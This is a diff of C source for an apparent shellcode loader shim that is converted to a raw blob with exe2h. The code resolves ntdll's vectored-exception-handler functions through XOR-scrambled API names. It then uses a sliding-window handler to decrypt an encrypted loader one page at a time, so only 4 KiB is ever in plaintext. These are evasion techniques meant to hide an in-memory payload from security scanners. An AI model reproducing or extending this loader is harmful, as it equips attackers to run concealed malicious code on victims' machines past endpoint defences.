@@ -63,7 +63,29 @@
    shim_strcmp / shim_stricmp XOR the scrambled side back during compare. */
 #define SX(c) ((char)((unsigned char)(c) ^ SHIM_STRING_XOR))
 
-/* --- Shared VEH context --- */
+/* IN_TEXT_Z places module-level data inside .text so exe2h's section
+   extraction captures it. MSVC routes via a `.veh$z` section that the
+   linker merges into .text (a direct `.text$z` placement produces a
+   second initialized-data .text section that exe2h drops). gcc puts
+   it directly in .text via the section attribute. */
+#ifdef _MSC_VER
+#  pragma section(".veh$z", read, execute)
+#  pragma comment(linker, "/MERGE:.veh=.text")
+#  define IN_TEXT_Z __declspec(allocate(".veh$z"))
+#else
+#  define IN_TEXT_Z __attribute__((section(".text"), used))
+#endif
+
+/* XOR-scrambled API names. Forward-declared here, defined at the
+   bottom of the file so VehShimEntry stays at .text+0 under gcc's
+   -fno-toplevel-reorder (where declaration order is preserved). */
+extern char k_addveh_xor[];
+extern char k_remveh_xor[];
+
+/* Shared VEH context. Single-slot sliding window - 4 KiB plaintext
+   exposure at any moment. Source-level invariant: no backward-branch
+   loop body straddles a 4 KiB boundary; enforced by per-function PE
+   sections (see include/poly_section.h) under MSVC. */
 typedef struct {
     void     *loader_base;
     void     *pfnVirtualProtect;
@@ -73,10 +95,6 @@ typedef struct {
     uint64_t  page_master_key;
 } VEH_CTX;
 
-/*
- * g_ctx lives at the end of .text so exe2h captures it.
- * Compiler uses RIP-relative addressing - works within same section.
- */
 extern volatile VEH_CTX g_ctx;
 
 /* Sentinel values - generator patches these in the blob */
@@ -101,10 +119,12 @@ static int    shim_stricmp(const char *a, const char *b);
 static int    shim_strcmp(const char *a, const char *b);
 
 
-/* ================================================================
- * VehShimEntry - MUST be first function (offset 0 in .text).
- * Entered via fallthrough from XOR decoder. RCX = instance pointer.
- * ================================================================ */
+/* VehShimEntry - MUST be at .text+0. Entered via fallthrough from the
+   XOR decoder. RCX = instance, RDX = shim base. Pinned to .text$a
+   under MSVC so /Gy COMDAT merging doesn't reorder it. */
+#ifdef _MSC_VER
+__declspec(code_seg(".text$a"))
+#endif
 void VehShimEntry(void *inst, void *shim_base) {
     volatile uint32_t ldr_off  = SENTINEL_LOADER_OFFSET;
     volatile uint32_t ldr_sz   = SENTINEL_LOADER_SIZE;
@@ -166,19 +186,12 @@ void VehShimEntry(void *inst, void *shim_base) {
         /* VEH sliding window with per-page encryption */
         char s_ntdll[]  = {SX('n'),SX('t'),SX('d'),SX('l'),SX('l'),SX('.'),
                            SX('d'),SX('l'),SX('l'),0};
-        char s_addveh[] = {SX('R'),SX('t'),SX('l'),SX('A'),SX('d'),SX('d'),
-                           SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
-                           SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
-                           SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0};
-        char s_remveh[] = {SX('R'),SX('t'),SX('l'),SX('R'),SX('e'),SX('m'),SX('o'),SX('v'),SX('e'),
-                           SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
-                           SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
-                           SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0};
 
         void *ntdll = shim_find_dll(s_ntdll);
         if (!ntdll) return;
-        AddVEH_fn pAddVEH = (AddVEH_fn)shim_get_export(ntdll, s_addveh);
-        RemVEH_fn pRemVEH = (RemVEH_fn)shim_get_export(ntdll, s_remveh);
+
+        AddVEH_fn pAddVEH = (AddVEH_fn)shim_get_export(ntdll, (char*)k_addveh_xor);
+        RemVEH_fn pRemVEH = (RemVEH_fn)shim_get_export(ntdll, (char*)k_remveh_xor);
         if (!pAddVEH || !pRemVEH) return;
 
         volatile uint64_t page_key = ((uint64_t)pk_hi << 32) | (uint64_t)pk_lo;
@@ -205,6 +218,7 @@ void VehShimEntry(void *inst, void *shim_base) {
         pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);
 
         PVOID veh_handle = pAddVEH(1, SlidingVehHandler);
+        if (!veh_handle) return;
 
         /* First instruction of loader faults - VEH decrypts page 0 */
         loader_entry(inst);
@@ -293,10 +307,8 @@ static void xor_page(void *page_addr, uint64_t master_key, uint32_t page_index) 
     }
 }
 
-/* ================================================================
- * VEH Handler - decrypts/re-encrypts a 1-page RX window across
- * the loader. Only one page of cleartext exists at any time.
- * ================================================================ */
+/* Decrypts the faulting page, re-encrypts the previously-decrypted one.
+   Only one loader page is cleartext at any moment. */
 static LONG CALLBACK SlidingVehHandler(PEXCEPTION_POINTERS ep) {
     DWORD old;
 
@@ -422,10 +434,23 @@ static int shim_strcmp(const char *a, const char *b) {
     return (*a != *b) ? 1 : 0;
 }
 
-/* g_ctx in .text so exe2h captures it. Placed after all functions. */
+/* Scrambled API names. Defined at file tail so they land after
+   VehShimEntry in .text under both compilers. */
+IN_TEXT_Z char k_addveh_xor[] = {
+    SX('R'),SX('t'),SX('l'),SX('A'),SX('d'),SX('d'),
+    SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
+    SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
+    SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0
+};
+IN_TEXT_Z char k_remveh_xor[] = {
+    SX('R'),SX('t'),SX('l'),SX('R'),SX('e'),SX('m'),SX('o'),SX('v'),SX('e'),
+    SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
+    SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
+    SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0
+};
+
 #ifdef _MSC_VER
-#pragma section(".text", read, write, execute)
-__declspec(allocate(".text"))
+__declspec(allocate(".veh$z"))
 volatile VEH_CTX g_ctx = { 0, 0, 0, 0, 0, 0 };
 #else
 __attribute__((section(".text"), used))
